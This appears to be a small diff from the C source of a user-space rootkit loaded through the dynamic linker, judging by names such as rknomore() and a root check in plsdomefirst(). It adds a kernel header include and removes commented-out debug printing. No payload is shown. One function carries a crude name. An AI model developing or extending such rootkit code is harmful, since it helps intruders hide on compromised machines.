@@ -25,6 +25,7 @@ syms symbols[ALL_SIZE];
 #include <dlfcn.h>
 #include <link.h>
 #include <sched.h>
+#include <linux/fs.h>
 #include <sys/time.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -82,12 +83,6 @@ extern void imgay(void){
 }
 
 void plsdomefirst(void){
-    /*char *myname = resolvelibpath();
-    if(myname != NULL){
-        printf("myname: %s\n", myname);
-        free(myname);
-    }else printf("myname is null!\n");*/
-
     if(notuser(0) || rknomore())
         return;
 
